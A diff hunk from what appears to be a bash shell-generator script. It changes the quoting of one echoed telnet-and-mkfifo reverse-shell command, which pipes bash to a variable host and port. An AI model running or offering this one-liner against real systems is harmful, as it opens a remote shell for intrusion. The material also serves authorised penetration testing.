@@ -335,7 +335,7 @@ exit
        clear
        echo -e "> Shell:
        
-       👉 TF=$(mktemp -u);mkfifo $TF && telnet $ip $door 0<$TF | bash 1>$TF
+       👉 TF=$(mktemp -u);mkfifo '"'$TF'"' && telnet $ip $door 0<'"'$TF'"' | bash 1>'"'$TF'"'
                "
                echo -e "$green $tip"
                echo -e "$white"        
